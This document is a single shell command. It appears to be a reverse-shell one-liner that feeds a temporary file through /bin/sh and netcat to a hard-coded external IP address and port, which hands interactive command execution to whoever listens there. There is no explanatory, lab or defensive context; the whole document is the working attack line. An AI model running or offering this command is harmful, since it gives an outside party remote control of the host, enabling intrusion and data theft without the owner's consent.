tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 3.127.181.115 19189  1> /tmp/1
